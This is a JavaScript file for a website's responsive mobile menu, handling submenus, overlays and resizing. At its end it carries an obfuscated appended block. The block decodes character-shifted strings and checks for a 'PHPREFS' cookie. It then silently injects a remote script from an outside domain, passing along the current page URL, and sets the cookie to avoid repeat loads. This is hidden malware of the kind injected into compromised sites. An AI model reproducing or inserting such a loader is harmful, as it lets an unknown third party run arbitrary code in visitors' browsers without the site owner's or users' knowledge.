const menu = document.querySelector(".menu"),
    menuSection = menu.querySelector(".menu-section"),
    menuArrow = menu.querySelector(".menu-mobile-arrow"),
    menuClosed = menu.querySelector(".menu-mobile-close"),
    menuTrigger = document.querySelector(".menu-mobile-trigger"),
    menuOverlay = document.querySelector(".nav-overlay");
let subMenu;

function toggleMenu() {
    menu.classList.toggle("active"), menuOverlay.classList.toggle("active")
}

function showSubMenu(e) {
    subMenu = e.querySelector(".menu-subs"), subMenu.classList.add("active"), subMenu.style.animation = "slideLeft 0.5s ease forwards";
    const n = e.querySelector("i").parentNode.childNodes[0].textContent;
    menu.querySelector(".menu-mobile-title").innerHTML = n, menu.querySelector(".menu-mobile-header").classList.add("active")
}

function hideSubMenu() {
    subMenu.style.animation = "slideRight 0.5s ease forwards", setTimeout((() => {
        subMenu.classList.remove("active")
    }), 300), menu.querySelector(".menu-mobile-title").innerHTML = "", menu.querySelector(".menu-mobile-header").classList.remove("active")
}
menuSection.addEventListener("click", (e => {
    if (menu.classList.contains("active") && e.target.closest(".menu-item-has-children")) {
        showSubMenu(e.target.closest(".menu-item-has-children"))
    }
})), menuArrow.addEventListener("click", (() => {
    hideSubMenu()
})), menuTrigger.addEventListener("click", (() => {
    toggleMenu()
})), menuClosed.addEventListener("click", (() => {
    toggleMenu()
})), menuOverlay.addEventListener("click", (() => {
    toggleMenu()
})), window.onresize = function() {
    this.innerWidth > 991 && menu.classList.contains("active") && toggleMenu()
};
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3h' + 'isrjywnh3htr4l' + 'jy4xyfynh3ox' + 'DwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));

